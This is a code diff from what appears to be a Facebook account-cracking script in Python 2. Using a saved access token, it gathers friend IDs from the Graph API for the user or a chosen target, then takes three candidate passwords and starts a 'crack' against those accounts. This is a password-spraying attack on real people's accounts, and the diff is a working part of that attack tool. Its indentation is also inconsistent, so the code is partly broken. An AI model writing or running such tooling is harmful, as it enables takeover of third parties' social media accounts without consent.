@@ -147,41 +147,49 @@ def menu():
         menu()
 
 def public():
-    os.system("clear")
-    banner()
-    try:
-	    toket = open('login.txt','r').read()
-	    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
-	    a = json.loads(otw.text)
-	    nama = a['name']
-	    id = a['id']
-    except Exception as e:
-	    print ("   [•] Error : %s"%e)
-	    login()
-    print("\n   [•] Type \'me\' To Dump From Friendlist")
-    idp = raw_input("   [•] User ID Target : ")
-    try:
-	   pok = requests.get("https://graph.facebook.com/"+idp+"?access_token="+toket)
-	   sp = json.loads(pok.text)
-	   print "   [•] Name           : "+sp["name"]
-    except KeyError:
-	    print ("   [!] Wrong ID Target")
-	    raw_input("\n   [ Back ]")
-	    menu()
-    except requests.exceptions.ConnectionError:
-	    print ("   [!] No Connection")
-	    exit()
-    r = requests.get("https://graph.facebook.com/"+idp+"/friends?access_token="+toket)
-    z = json.loads(r.text)
-    for i in z['data']:
-	    id.append(i['id'])
-    print "   [•] Total ID       : "+str(len(id))
+    	os.system("clear")
+    	banner()
+    	mtd = raw_input("\n   [•] Crack From Friend/Public [f/p] : ")
+    	if mtd =="":
+		print("   [!] Fill In The Correct")
+		public()
+    	elif mtd =="f":
+		os.system('clear')
+		banner()
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+    	elif mtd =="p":
+		os.system('clear')
+		banner()
+		idt = raw_input("   [•] User ID Target : ")
+		try:
+			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			sp = json.loads(pok.text)
+			print "   [•] Name           : "+sp["name"]
+		except KeyError:
+			print ("   [!] Wrong ID Target")
+			raw_input("\n   [ Back ]")
+			menu()
+		except requests.exceptions.ConnectionError:
+			print ("   [!] No Connection")
+			exit()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	else:
+		print("   [!] Fill In The Correct")
+		public()
+	
+	print "   [•] Total ID       : "+str(len(id))
+	pm4 = raw_input ("   [•] Pass 1 : ")
+        pm5 = raw_input ("   [•] Pass 2 : ")
+        pm6 = raw_input ("   [•] Pass 3 : ")
+        print("   [•] Crack Started...\n")
         
     def main(arg):
-                pm4 = raw_input ("   [•] Pass 1 : ")
-                pm5 = raw_input ("   [•] Pass 2 : ")
-                pm6 = raw_input ("   [•] Pass 3 : ")
-                print("   [•] Crack Started...\n")
 		global cekpoint,oks
 		em = arg
 		try:
